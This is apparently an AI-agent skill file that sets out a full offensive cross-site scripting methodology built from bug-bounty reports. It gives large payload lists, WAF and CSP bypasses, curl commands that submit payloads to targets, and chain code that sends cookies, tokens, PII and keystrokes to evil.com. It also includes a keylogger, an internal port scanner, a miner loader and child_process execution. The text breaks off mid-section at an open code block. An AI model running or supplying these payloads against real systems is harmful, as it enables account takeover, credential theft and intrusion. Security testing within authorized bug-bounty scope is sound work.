---
name: xss-deep-dive
description: Complete XSS methodology from 394 real HackerOne reports - every vector, bypass, payload, and chain
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - xss methodology
  - xss deep dive
  - xss complete
  - xss all techniques
  - cross site scripting
  - skills xss
---

# Complete XSS Methodology - From 394 HackerOne Reports

## Top 30 Real XSS Reports from HackerOne

| # | Report | Program | Upvotes | Bounty |
|---|--------|---------|---------|--------|
| 1 | [Bypass for #488147 enables stored XSS on paypal.com/signin again](https://hackerone.com/reports/510152) | PayPal | 2,675 | $20,000 |
| 2 | [Reflected XSS on glassdoor.com/employers/sem-dual-lp/](https://hackerone.com/reports/846338) | Glassdoor | 684 | $0 |
| 3 | [Stored XSS on paypal.com/signin via cache poisoning](https://hackerone.com/reports/488147) | PayPal | 682 | $18,900 |
| 4 | [Stored XSS in Wiki pages](https://hackerone.com/reports/526325) | GitLab | 621 | $0 |
| 5 | [Stored XSS on imgur profile](https://hackerone.com/reports/484434) | Imgur | 610 | $0 |
| 6 | [One-click account hijack for Apple sign-in + XSS on redditmedia.com](https://hackerone.com/reports/1567186) | Reddit | 503 | $0 |
| 7 | [XSS in steam react chat client](https://hackerone.com/reports/409850) | Valve | 491 | $7,500 |
| 8 | [Reflected XSS in OAUTH2 login flow](https://hackerone.com/reports/697099) | LY Corp | 486 | $1,989 |
| 9 | [XSS on tiktok.com leading to Data Exfiltration](https://hackerone.com/reports/968082) | TikTok | 468 | $0 |
| 10 | [XSS vulnerable parameter in a location hash](https://hackerone.com/reports/146336) | Slack | 453 | $0 |
| 11 | [Blind XSS on image upload](https://hackerone.com/reports/1010466) | CS Money | 444 | $1,000 |
| 12 | [Panorama UI XSS → RCE via Kick/Disconnect Message](https://hackerone.com/reports/631956) | Valve | 417 | $0 |
| 13 | [Stored XSS Vulnerability](https://hackerone.com/reports/643908) | WordPress | 402 | $0 |
| 14 | [Redirect parameter allows for XSS](https://hackerone.com/reports/1962645) | Reddit | 393 | $5,000 |
| 15 | [Reflected XSS on hackerone.com](https://hackerone.com/reports/840759) | HackerOne | 386 | $500 |
| 16 | [Reflected XSS + sensitive data exposure on lioncityrentals.com.sg](https://hackerone.com/reports/340431) | Uber | 376 | $4,000 |
| 17 | [HEY.com email stored XSS](https://hackerone.com/reports/982291) | Basecamp | 358 | $5,000 |
| 18 | [Blind XSS on Twitter's internal Big Data panel](https://hackerone.com/reports/1207040) | X / xAI | 357 | $0 |
| 19 | [Stored XSS in wordpress.com](https://hackerone.com/reports/733248) | Automattic | 356 | $0 |
| 20 | [Reflected XSS in TikTok endpoints](https://hackerone.com/reports/1350887) | TikTok | 356 | $0 |
| 21 | [XSS while logging using Google](https://hackerone.com/reports/691611) | Shopify | 341 | $1,750 |
| 22 | [Stored XSS in Private Message component (BuddyPress)](https://hackerone.com/reports/487081) | WordPress | 337 | $0 |
| 23 | [DOM XSS on duckduckgo.com search](https://hackerone.com/reports/868934) | DuckDuckGo | 326 | $0 |
| 24 | [Stored XSS in staff name fired in internal panel](https://hackerone.com/reports/946053) | Shopify | 325 | $0 |
| 25 | [yelp.com XSS ATO via login keylogger, link Google account](https://hackerone.com/reports/2010530) | Yelp | 321 | $0 |
| 26 | [Reflected XSS](https://hackerone.com/reports/739601) | Bumble | 317 | $1,000 |
| 27 | [Stored XSS in markdown via DesignReferenceFilter](https://hackerone.com/reports/1212067) | GitLab | 315 | $16,000 |
| 28 | [Stored-XSS-ads.tiktok.com](https://hackerone.com/reports/2306491) | TikTok | 310 | $0 |
| 29 | [Stored XSS via Kroki diagram](https://hackerone.com/reports/1731349) | GitLab | 293 | $13,950 |
| 30 | [Account takeover through cookie manipulation + XSS](https://hackerone.com/reports/534450) | Superhuman | 289 | $0 |

## Step 1: XSS Attack Surface - Every Possible Vector

### Reflected XSS Vectors

Every parameter reflecting back in response is a vector:

```bash
# URL parameters (most common)
?q=SEARCH&s=search&page=1&error=ERROR&message=MSG&status=STATUS
?callback=CALLBACK&redirect=URL&next=PATH&return=URL
?name=NAME&email=EMAIL&file=FILE&debug=DEBUG

# HTTP headers (often overlooked)
User-Agent, Referer, X-Forwarded-For, X-Forwarded-Host
Cookie, Accept-Language, Accept-Encoding, Origin

# POST body parameters
json={"key":"VALUE"}, form fields, multipart parameters

# URL path injection (real H1: #1051373 - Reddit)
https://target.com/<script>alert(1)</script>

# File upload filenames (real H1: #578138)
<script>alert(1)</script>.jpg
```

### Stored XSS Vectors

| Location | Real Report Examples |
|----------|---------------------|
| Profile fields (name, bio, location) | #484434 Imgur, #946053 Shopify |
| Comments / posts | #526325 GitLab Wiki, #733248 WordPress |
| Rich text editors (Trix, Froala, TinyMCE) | #2819573 Basecamp, #2521419 Basecamp |
| Email content / subject | #982291 Basecamp HEY, #387272 Mail.ru |
| File upload metadata | #808862 Visma, #1276742 Shopify SVG |
| Markdown rendering | #1212067 GitLab, #1731349 GitLab Kroki |
| Chat messages | #409850 Valve Steam, #729424 Shopify |
| Address / billing fields | #411690 AAF |
| Widget configuration | #708589 New Relic charts |
| Custom emoji / labels | #1198517 GitLab, #1665658 GitLab |
| Document titles | #1321407 Localize |
| Invoice / form fields | #808672 Visma |
| Backup scan names | #961046 Acronis |
| Email templates | #1376672 Judge.me |

### DOM-Based XSS Vectors

```javascript
// postMessage (real H1: #398054, #499030, #2371019)
window.addEventListener('message', function(e) {
  document.getElementById('frame').innerHTML = e.data;  // XSS
  document.write(e.data);                                // XSS
  eval(e.data);                                          // XSS
  location.href = e.data;                                // XSS
});

// hash/fragment (real H1: #146336 Slack)
location.hash                                           // XSS via #<script>
location.hash.slice(1)                                  // XSS via #<img src=x onerror=alert(1)>

// URL/location sources (real H1: #2583874 TikTok)
location.href, location.search, location.pathname
document.URL, document.documentURI, document.baseURI

// DOM sinks
document.write(), document.writeln()
innerHTML, outerHTML, insertAdjacentHTML()
eval(), setTimeout(), setInterval(), Function()
execCommand(), document.createComment()
srcdoc attribute, iframe src with javascript:
script.src, script.text, script.textContent
onerror/onload/onclick handlers
style tag injection
```

### mXSS (Mutation XSS) Vectors

```javascript
// Mutation Observable (real H1: #2819573 Basecamp Trix)
// Payload that mutates during DOM parsing/rendering

// CSS scoping mXSS
<style><!--</style><img src=x onerror=alert(1)>--></style>

// Namespace confusion
<svg><style></style><img src=x onerror=alert(1)></svg>

// Form action mXSS
<form action="javascript:alert(1)"><button>Click</button></form>

// noscript / xmp / listing mXSS
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// import / media mXSS
<math><mtext><table><mglyph><svg><mtext></math>
  <img src=x onerror=alert(1)>
</mtext></svg></mglyph></table></mtext></math>
```

## Step 2: XSS Testing Methodology

### Phase 1: Recon for XSS

```bash
# Find all input points
grep -E '(\?|&)(q|s|search|query|page|id|file|name|email|url|redirect|next|return|callback|error|message|msg|text|comment|desc|title|subject|body|content|type|format|lang|sort|order|filter|tag|cat|category|term|product|item|user|account|token|key|ref|refe|source|action|do|mode|view|func|command|debug|test|preview|theme|style|color|size|limit|offset|start|end|date|time|group|role|perm|status|state|step|flow|tab|section|page|p|page_id|post_id|thread|board|forum|topic|reply)[=:]' recon/target/urls.txt | sort -u

# Extract all parameters from JS files
grep -rohP '(?<=[?&])[^=&]+(?==)' recon/target/js/ | sort -u

# Find stored input locations
# - Profile settings (name, bio, website, location)
# - Comments, forum posts, reviews
# - File uploads (avatars, attachments, documents)
# - Rich text editors, wikis, markdown
# - Email templates, notification content
# - Chat messages, direct messages
# - Custom fields, metadata tags

# Discover hidden parameters
arjun -u https://target.com/page --get -oT params_xss.txt
```

### Phase 2: Basic XSS Testing

```bash
# Universal test payloads
# Every input point gets tested with these

# HTML context
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>

# Attribute context
" onmouseover=alert(1) "
' onfocus=alert(1) '
" autofocus onfocus=alert(1) "
javascript:alert(1)

# JavaScript context
';alert(1);//
";alert(1);//
</script><script>alert(1)</script>

# URL context
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### Phase 3: Context-Aware Testing

#### HTML Context
```bash
# Between HTML tags: <div>INPUT</div>
# Test:
<div><script>alert(1)</script></div>
<div><img src=x onerror=alert(1)></div>
<div><svg/onload=alert(1)></div>
<div><details open ontoggle=alert(1)></div>

# Check encoding:
<div>&lt;script&gt;alert(1)&lt;/script&gt;</div>  # Encoded not XSS
<div><script>alert(1)</script></div>              # Raw = vulnerable
```

#### Attribute Context
```bash
# Inside quotes: <div class="INPUT">
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) "
" onfocus=alert(1) id="x

# Inside unquoted: <div class=INPUT>
x onclick=alert(1) x=y

# Inside href/src: <a href="INPUT">
javascript:alert(1)
javascript:eval(atob('YWxlcnQoMSk='))

# Event handler attr: <img onerror="INPUT">
alert(1)
fetch('https://evil.com/'+document.cookie)
```

#### JavaScript Context
```bash
# Inside string: <script>var x = 'INPUT';</script>
';alert(1);//
\';alert(1);//

# Inside backtick template: <script>var x = `INPUT`;</script>
${alert(1)}
${document.location='https://evil.com/'+document.cookie}

# Inside JS with encoding: <script>x="INPUT"</script>
x=";alert(1);//
x=";fetch('/api/user').then(r=>r.text()).then(d=>fetch('https://evil.com/'+d));//

# JSON context: <script>var x = {"key":"INPUT"};</script>
", "x": "a
"-alert(1)-"
```

#### URL Context
```bash
# Full URL: <a href="INPUT">
javascript:alert(1)
javascript:eval(atob('YWxlcnQoMSk='))

# Protocol-relative: <a href="//INPUT">
//evil.com
javascript:alert(1)

# Inside path: <a href="https://target.com/INPUT">
/"><script>alert(1)</script>
/%22%3E%3Cscript%3Ealert(1)%3C/script%3E
```

### Phase 4: Blind XSS Detection

```bash
# Use XSS hunter / interactsh / your own listener
# Payloads that fire back to your server:

"><script src=https://YOUR-ID.xss.ht></script>
"><img src=x onerror="eval(atob('BASE64_CODE'))">
"><link rel=stylesheet href=https://YOUR-ID.xss.ht>
"><svg/onload=eval(atob('BASE64_CODE'))>

# Common blind XSS locations (from real reports):
# - Support ticket names/emails (#1207040 Twitter)
# - Admin panel username (#746505 Mail.ru)
# - User-Agent in admin logs (#275518)
# - Contact form fields (#1339034 Judge.me)
# - Report/feedback text (#724889 Zomato)
# - Application form fields (#666040 Acronis)
# - Profile fields viewed by admins (#1558010 H1)
```

### Phase 5: Stored XSS Detection

```bash
# 1. Submit payloads to every data persistence point
# 2. Check ALL viewing contexts for the data:
#    - User profile page
#    - Admin dashboard
#    - Email notifications
#    - API responses
#    - Search results
#    - Export/download files (CSV, PDF, XLS)
#    - Activity feeds
#    - Mobile app views

# 3. Second-order stored XSS (real H1: #946053 Shopify)
#    - Payload stored in field A → executed when viewed in field/context B
#    - Example: Staff name stored → viewed in admin panel → XSS

# 4. Stored XSS via file upload (real H1: #808862, #880099)
curl -sk -F "file=@xss.svg" "https://target.com/upload"
curl -sk -F "file=@xss.html" "https://target.com/upload"

# SVG stored XSS payload
cat > xss.svg << 'EOF'
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>
EOF
```

## Step 3: XSS Bypass Techniques Encyclopedia

### CSP Bypass Techniques

| # | Technique | Payload | Real Report |
|---|-----------|---------|-------------|
| 1 | JSONP endpoints | `<script src="/api/jsonp?callback=alert(1)>` | #398054, #259100 |
| 2 | File upload to same origin | `<script src="/uploads/xss.js>` | #880099, #1276742 |
| 3 | Angular sandbox escape | `{{constructor.constructor('alert(1)')()}}` | #1095934 |
| 4 | CVE-2023-44487 (nunjucks) | Template engine CSP bypass | |
| 5 | CRLF to header injection | Reflected script tag via header injection | #2012519 TikTok |
| 6 | Style injection + data exfil | `@import url(//evil.com?leak)` with `style-src 'unsafe-inline'` | |
| 7 | base-uri bypass | `<base href="//evil.com"><script src=/valid.js>` | |
| 8 | CDN callback bypass | `<script src="//cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"><script>{{$on.constructor('alert(1)')()}}>` | |
| 9 | Nonce bypass via DOM clobbering | Create elements that steal nonce from page | |
| 10 | file: protocol in frame | `<iframe src="file:///etc/passwd">` | |
| 11 | Open redirect to script load | `<script src="//open-redirect.com/rd?url=https://evil.com/xss.js">` | #146336 Slack |
| 12 | RPO (Relative Path Overwrite) | `https://target.com/css/../xss.js` | |
| 13 | WebSocket bypass | `new WebSocket('wss://evil.com')` if `connect-src` allows | |
| 14 | pdf.js sandbox escape | `.pdf#page=1&zoom=100,#xss` | |
| 15 | browser extension hooks | Chrome extension accessible resources | |
| 16 | JSONP via google APIs | `<script src="https://www.google.com/complete/search?client=chrome&q=test&callback=alert">` | |
| 17 | Prototype pollution → XSS | `?__proto__[asd]=alert(document.domain)` via clobbered sink | #998398 Elastic |
| 18 | Meta refresh bypass | `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">` | |
| 19 | Web app manifest injection | Injected manifest can bypass certain CSP directives | |
| 20 | CVE-2024-41937 (Airflow) | Stored XSS via provider link | #2677187 |

```bash
# Label/color CSP bypass for GitLab (real H1: #1665658, #1693150)
# GitLab's CSP allowed inline styles with specific nonce
# Using label color field to inject CSS that exfiltrates data:
<svg onload="fetch('https://evil.com/?c='+document.cookie)">

# CSP bypass via scoped labels' color (real H1: #1693150)
# The color value was injected into a style tag allowing:
color: red; background-image: url(https://evil.com/?leak=
```

### WAF Bypass Techniques

| # | Technique | Payload |
|---|-----------|---------|
| 1 | Case variation | `<ScRiPt>alert(1)</ScRiPt>` |
| 2 | Mixed encoding | `&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;alert(1)&#x3C;/script&#x3E;` |
| 3 | Double encoding | `%253Cscript%253Ealert(1)%253C/script%253E` |
| 4 | Unicode normalization | `﹤script﹥alert(1)﹤/script﹥` (fullwidth chars) |
| 5 | Null byte injection | `<scr<script>ipt>alert(1)</scr</script>ipt>` |
| 6 | Nested tags | `<scr<script>ipt>alert(1)</scr</script>ipt>` |
| 7 | Polyglot payloads | `"onmouseover=alert(1) style=position:fixed;top:0;left:0;width:100%;height:100%` |
| 8 | Comment injection | `<!--><script>alert(1)</script>` |
| 9 | Line break injection | `<script%0a>alert(1)</script>` |
| 10 | Tab injection | `<script%09>alert(1)</script>` |
| 11 | Alternate event handlers | `<body/onload=alert(1)>` vs `<body onload=alert(1)>` |
| 12 | SVG bypass | `<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>` |
| 13 | Form action bypass | `<form action=javascript:alert(1)><button>click` |
| 14 | Details/open bypass | `<details open ontoggle=alert(1)>` |
| 15 | Import tag bypass | `<link rel=import href="data:text/html,<script>alert(1)</script>">` |
| 16 | Space replacement | `/<img/src=x/onerror=alert(1)>` (no spaces needed) |
| 17 | Newline in attributes | `/<img src="x" onerror="alert(1)">` (newline between attrs) |
| 18 | Base64 data URI | `<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>` |
| 19 | DNS prefetch XSS | `<link rel=dns-prefetch href=//evil.com>` |
| 20 | J&#avas&#99;ript obfuscation | `javascript&#58;alert(1)` |
| 21 | CSS expression (IE only) | `<div style="x:expression(alert(1))">` |
| 22 | `-moz-binding` (FF old) | `<div style="-moz-binding:url('http://evil.com/xss.xml')">` |
| 23 | `%` before keyword | `/%3Cscript%3Ealert(1)%3C/script%3E` |
| 24 | Double URL encoding | `%253Cscript%253E` - if server decodes twice |
| 25 | sRc vs src mixing | `<iMg sRc=x OnErRoR=alert(1)>` |
| 26 | Windows 1252 encoding | `Š` → `<` in some encoding mismatches |
| 27 | Charset switching | `<meta charset="UTF-7">+ADw-script+AD4-alert(1)+ADw-/script+AD4-` |
| 28 | PHP IDS bypass | `???>` (PHP short tag) |
| 29 | JSON XSS bypass | `'\u003Cscript\u003Ealert(1)\u003C/script\u003E'` |

### Filter Bypass Techniques

```bash
# Semicolon removal bypass
<Img/Src=X/OnError=alert(1)>    # No semicolons needed

# Parent function obfuscation
<a onmouseover="alert(1)">      # Basic
<a onmouseover=alert(1)>        # No quotes
<a onmouseover=&#97;&#108;&#101;&#114;&#116;(1)>  # HTML entities in attributes

# Overlong UTF-8 encoding
%C0%BCscript%20%00%00%00%00%00%00%C0%BC/script%C0%BE

# Template literal injection
${alert(1)}
`${alert(1)}`

# Prototype pollution chain
?__proto__[x]=1&__proto__[onload]=alert(1)  # #998398 Elastic

# Bypass newline/truncation filters
<a     href="javascript:alert(1)">
<a
href="javascript:alert(1)">

# MySQL charset switching
?q=test' UNION SELECT '<script>alert(1)</script>'-- -

# Unicode escape in JS
\x3cscript\x3ealert(1)\x3c/script\x3e
\u003cscript\u003ealert(1)\u003c/script\u003e

# Octal escape in JS
\74script\76alert(1)\74/script\76

# String.fromCharCode bypass
String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)
eval(String.fromCharCode(97,108,101,114,116,40,49,41))

# atob() base64 decode
eval(atob('YWxlcnQoMSk='))

# Window.name bypass
<iframe name="alert(1)" src="https://target.com/iframe_content.html>

# document.write dynamic
document.write('<'+'script>alert(1)<'+'/script>')
```

## Step 4: Real-World XSS Exploit Chains

### Chain 1: XSS → Account Takeover

```javascript
// 1. XSS payload to steal auth tokens / session
fetch('/api/user/tokens').then(r=>r.json()).then(d=>{
  fetch('https://evil.com/steal?data='+JSON.stringify(d))
});

// 2. Use stolen tokens to access account
// Real H1 examples:
// #2010530 - yelp.com XSS ATO via login keylogger
// #534450 - Superhuman ATO via cookie manipulation + XSS
// #723060 - Razer reflected XSS escalated to ATO
// #1567186 - Reddit one-click hijack via Apple sign-in + XSS

// Full keylogger payload (real #2010530 Yelp):
document.addEventListener('keypress', function(e) {
  var img = new Image();
  img.src = 'https://evil.com/k?k=' + e.key;
});
```

### Chain 2: XSS → Session Hijacking

```javascript
// Steal cookies
var img = new Image();
img.src = 'https://evil.com/steal?c=' + encodeURIComponent(document.cookie);

// Steal localStorage / sessionStorage
var data = JSON.stringify(localStorage);
fetch('https://evil.com/exfil', {method:'POST', body:data});

// Steal CSRF tokens from DOM
var csrf = document.querySelector('[name=csrf]').value;
fetch('https://evil.com/exfil?csrf='+csrf);

// Steal from iframes / cross-origin (if misconfigured)
// Real #397968 - Evernote wormable stored XSS
// Real #231053 - Shopify postMessage digital wallets XSS
```

### Chain 3: XSS → CSRF Bypass

```javascript
// XSS automatically bypasses CSRF protection
// Pick the action: change email, add SSH key, transfer funds

fetch('/user/email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
}).then(() => {
  fetch('/user/password-reset', {method: 'POST'});
});

// Real H1 examples chaining XSS + CSRF:
// #323005 - CSRF leads to stored self-XSS (Imgur)
// #604120 - Leakage of CSRF token leading to XSS + ATO (InnoGames)
```

### Chain 4: XSS → Data Exfiltration

```javascript
// Exfiltrate page content
fetch('/api/admin/users').then(r=>r.text()).then(d=>{
  new Image().src = 'https://evil.com/ex?d=' + btoa(d);
});

// Exfiltrate form data (real #207042 - HackerOne Marketo XSS)
document.forms[0].addEventListener('submit', function(e) {
  e.preventDefault();
  var data = new FormData(this);
  fetch('https://evil.com/exfil', {method:'POST', body:new URLSearchParams(data)});
});

// PII exfiltration
fetch('/account').then(r=>r.text()).then(html=>{
  var name = html.match(/<span class="name">([^<]+)</)[1];
  var email = html.match(/<span class="email">([^<]+)</)[1];
  new Image().src = `https://evil.com/pii?n=${name}&e=${email}`;
});

// Real #968082 - TikTok XSS leading to data exfiltration
// Real #207042 - H1 contact form data via Marketo XSS
```

### Chain 5: XSS → Keylogging

```javascript
// Full keylogger
(function() {
  var keys = '';
  document.addEventListener('keypress', function(e) {
    keys += e.key;
    if (keys.length % 10 === 0) {
      new Image().src = 'https://evil.com/k?d=' + btoa(keys);
      keys = '';
    }
  });
  // Also capture input fields on blur
  document.addEventListener('focusout', function(e) {
    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
      new Image().src = 'https://evil.com/f?n=' + e.target.name + '&v=' + e.target.value;
    }
  });
})();

// Real #2010530 - Yelp XSS ATO via login keylogger
```

### Chain 6: XSS → Internal Network Scanning

```javascript
// Port scan internal network via timing (works in modern browsers)
async function scanPort(host, port) {
  var start = performance.now();
  try {
    await fetch(`http://${host}:${port}/`, {mode: 'no-cors', signal: AbortSignal.timeout(3000)});
  } catch(e) {}
  var elapsed = performance.now() - start;
  new Image().src = `https://evil.com/scan?h=${host}:${port}&t=${elapsed}`;
}

// Scan common internal IPs
['127.0.0.1', '10.0.0.1', '192.168.1.1', '172.16.0.1'].forEach(ip => {
  [80, 443, 8080, 3000, 5000, 9000].forEach(port => scanPort(ip, port));
});

// Full SSRF-like scanning via XSS
// Use XSS to reach internal services unreachable from outside
```

### Chain 7: XSS → Crypto Mining / Malicious Actions

```javascript
// In-browser crypto mining
var script = document.createElement('script');
script.src = 'https://evil.com/miner.js';
document.body.appendChild(script);

// Auto-post spam / defacement
fetch('/api/posts', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({title: 'GET FREE BITCOIN', content: '...'})
});

// Worm propagation (real #397968 - Evernote)
// XSS that replicates itself to other users/the same platform
```

### Chain 8: XSS → Remote Code Execution

```javascript
// Electron apps (desktop XSS → RCE)
// If target is Electron-based:
require('child_process').exec('calc.exe');

// Node.js server XSS
process.mainModule.require('child_process').execSync('id');

// Real H1 examples:
// #631956 - Valve Panorama UI XSS → RCE (Source engine)
// #409850 - Valve Steam react chat client XSS
```

## Step 5: XSS Automation

### Automated Scanning

```bash
# Auto-reflected XSS detection with ffuf
ffuf -u "https://target.com/search?q=FUZZ" \
  -w xss_payloads.txt \
  -mr "(alert|prompt|confirm)" \
  -t 50

# Scan multiple parameters
ffuf -u "https://target.com/page?PARAM=FUZZ" \
  -w xss_params.txt:PARAM \
  -w xss_payloads.txt:FUZZ \
  -mr "(alert|prompt|confirm|<script>|<img|<svg|<body)" \
  -t 30

# Scan all endpoints from recon
cat urls.txt | grep '=' | while read url; do
  echo "=== Testing: $url ==="
  ffuf -u "$url&FUZZ=test" -w xss_params.txt -mc all -t 20
done
```

### XSS Payload Wordlist

```bash
# Basic test payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video><source onerror=alert(1)>
<audio><source onerror=alert(1)>
" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='
javascript:alert(1)
';alert(1);//
";alert(1);//
</script><script>alert(1)</script>
<%= alert(1) %>
${alert(1)}
#{$alert(1)}
{{alert(1)}}
```

### Nuclei Templates

```bash
# Scan for reflected XSS
nuclei -l live_hosts.txt -t vulnerabilities/generic/xss/ -o xss_results.txt

# Scan for stored XSS endpoints
nuclei -l live_hosts.txt -t exposures/ -o stored_xss.txt

# Custom nuclei template for XSS
cat > xss_custom.yaml << 'EOF'
id: xss-custom

info:
  name: Reflected XSS Detection
  author: researcher
  severity: medium

requests:
  - method: GET
    path:
      - "{{BaseURL}}/search?q=<script>alert(1)</script>"
      - "{{BaseURL}}/?q=%3Csvg/onload=alert(1)%3E"
      - "{{BaseURL}}/?error=<img%20src=x%20onerror=alert(1)>"
    
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(1)</script>"
          - "<svg/onload=alert(1)>"
          - "<img src=x onerror=alert(1)>"
EOF

nuclei -t xss_custom.yaml -l live_hosts.txt
```

### Blind XSS Automation

```bash
# Deploy XSS hunter or use interactsh
# Payload templates for blind XSS:

BLIND_PAYLOADS=(
  '"><script src=https://YOUR.xss.ht/sh/XSS></script>'
  '"><img src=x onerror="eval(atob(\"BASE64\"))">'
  '"><svg/onload=eval(atob(\"BASE64\"))>'
  '"><link rel=stylesheet href=https://YOUR.xss.ht/sh/XSS>'
)

# Test all blind XSS payloads on common fields
for payload in "${BLIND_PAYLOADS[@]}"; do
  curl -sk -X POST "https://target.com/support/ticket" \
    -d "name=$payload&email=test@test.com&message=test"
  curl -sk -X POST "https://target.com/feedback" \
    -d "comment=$payload&rating=5"
done
```

### Stored XSS Automation

```bash
# Auto-submit payloads to stored input points
# Profile fields
curl -sk -X POST "https://target.com/profile/update" \
  -d "name=<script>alert(1)</script>&bio=<img src=x onerror=alert(1)>"

# File upload XSS test
curl -sk -F "file=@xss.html;filename=xss.html" "https://target.com/upload"
curl -sk -F "avatar=@xss.svg;filename=xss.svg" "https://target.com/avatar"

# Comment / post submission
curl -sk -X POST "https://target.com/post/comment" \
  -d "body=<script>alert(1)</script>&post_id=123"
```

## Step 6: Payout Ranges

| XSS Type | Low | Medium | High | Critical |
|----------|-----|--------|------|----------|
| Reflected XSS | $0 | $500 | $4,000 | $5,000 |
| Stored XSS | $250 | $1,000 | $5,000 | $18,900 |
| DOM XSS | $0 | $500 | $2,500 | $5,000 |
| Blind XSS | $500 | $1,000 | $5,000 | $0 (bounty varies) |
| XSS → ATO | $750 | $5,000 | $10,000 | $20,000 |
| XSS → RCE | $5,000 | $7,500 | $15,000 | $20,000+ |

### Top Bounties from Real Reports

| Bounty | Report | Company | Type |
|--------|--------|---------|------|
| $20,000 | #510152 | PayPal | Stored XSS (bypass) |
| $18,900 | #488147 | PayPal | Stored XSS via cache poisoning |
| $16,000 | #1212067 | GitLab | Stored XSS in markdown |
| $13,950 | #1731349 | GitLab | Stored XSS via Kroki diagram |
| $9,400 | #1444682 | Shopify | XSS at jamfpro.shopifycloud.com |
| $7,500 | #409850 | Valve | Steam react chat client XSS |
| $6,000 | #217739 | Uber | Stored XSS on any page |
| $5,300 | #1276742 | Shopify | Stored XSS in SVG file |
| $5,000 | #1962645 | Reddit | Redirect parameter XSS |
| $5,000 | #982291 | Basecamp | HEY.com email stored XSS |
| $5,000 | #1567186 | Reddit | One-click hijack + XSS |
| $4,875 | #881557 | Slack | Stored XSS via PDF viewer |
| $4,500 | #526325 | GitLab | Stored XSS in Wiki |
| $4,000 | #340431 | Uber | Reflected XSS + data exposure |
| $3,860 | #968082 | TikTok | XSS → Data exfiltration |

## Quick Reference: XSS by Technique

| Technique | Example Payload | Report Reference |
|-----------|----------------|-----------------|
| Cache Poison XSS | Cache poisoning + stored XSS | #488147 PayPal, #1424094 Glassdoor |
| postMessage DOM | `window.addEventListener('message'...` | #398054 H1, #231053 Shopify |
| SVG upload XSS | SVG with embedded script | #1276742 Shopify, #880099 GitLab |
| Markdown XSS | `` [xss](javascript:alert(1)) `` | #1212067 GitLab, #526325 GitLab |
| Template Literal | `${alert(1)}` | #1095934 FetLife |
| Blind XSS | `<script src=//xss.ht>` | #1010466 CS Money, #1207040 Twitter |
| Redirect → XSS | `javascript:alert(1)` in redirect param | #1962645 Reddit, #340431 Uber |
| Cache Poison → XSS | Unkeyed header + stored XSS | #1760213 Expedia |
| Prototype Pollution | `__proto__[x]=alert(1)` | #998398 Elastic |
| postMessage → XSS | Structured clone bypass | #231053 Shopify |
| mXSS (Trix) | Trix editor mutation XSS | #2819573 Basecamp |
| CRLF → XSS | CRLF injection in header → XSS | #2012519 TikTok |
| CSP bypass (style) | Label color CSS injection | #1665658 GitLab |
| XSS + Cookie Tossing | Self-XSS + cookie tossing + CSRF | #3423950 Cloudflare |

## Additional Techniques (External Sources)

### Self-XSS → Normal XSS by Bypassing X-Frame-Options via iframe
Self-XSS (requiring user to paste code into console/input) can be escalated to a normal XSS by embedding the target page in an iframe. Even if `X-Frame-Options: DENY` is set, you can bypass it using:
- `<iframe src="//target.com" sandbox="allow-scripts allow-same-origin">` — sandbox attribute can override frame restrictions
- Using `fetch()` + `document.write()` from an attacker-controlled page to simulate the same interaction
- Old browser quirks where `X-Frame-Options` is not respected in certain contexts (e.g., data: URIs, srcdoc iframes)

Once framed, the attacker can auto-fill forms, click buttons, or simulate user actions in the iframe context to trigger the self-XSS automatically.

### Two Minor Harmless Injections Combined → DOM-Based Reflected XSS
Two individually sanitized/safe injection points can combine to create a DOM-based XSS. For example:
- Injection 1: `window.location.hash` is split on `#` and the first part is used as a prefix
- Injection 2: A URL parameter is used as a suffix
- Combined: The attacker crafts `#"><img src=x onerror=alert(1)>&name=---` where neither alone creates XSS but together in a `document.write()` call they form executable HTML

### DOM XSS via XSS Payload in UID Field of Key Import
When importing cryptographic keys (e.g., SSH keys, PGP keys, GPG keys), the UID (User ID) field in the key is often displayed without sanitization. An attacker can craft a key with an XSS payload in the UID:
```
ssh-rsa AAAA... xss=<img src=x onerror=alert(document.cookie)>
```
If the application imports this key and renders the UID field in a web interface, the XSS fires.

### Image Injection Leaking OAuth Tokens via Referer Header
Third-party images loaded on OAuth callback pages can leak tokens via the Referer header:
```html
<img src="https://evil.com/tracker.png">
```
When the OAuth callback URL contains the access token in the query string (e.g., `https://target.com/callback?token=SECRET`), the Referer header sent to `evil.com` includes the full URL with the token. Tools like `<img>` tags in comments, profile pictures, or forum posts can be used to inject these trackers.

### RTLO (Right-to-Left Override) Character for URL Spoofing
The Unicode Right-to-Left Override character (U+202E) reverses the display order of subsequent text. Attackers can spoof URLs by embedding this character:
```
https://evil.com@target.com  → displays as https://evil.com@target.com
Using RTLO: https://target.com%E2%80%AEevil.com → displays as https://evil.com/moc.target...
```
The visual reversal tricks users into believing they are on a legitimate domain. This is especially effective in phishing links and when programs render user-submitted URLs.

### Reverse Tabnabbing via target=_blank
When a page opens a link with `target="_blank"` or `window.open()` without `rel="noopener noreferrer"`, the opened page gains partial access to the opener's `window` object via `window.opener`. A malicious opened page can redirect the original tab:
```javascript
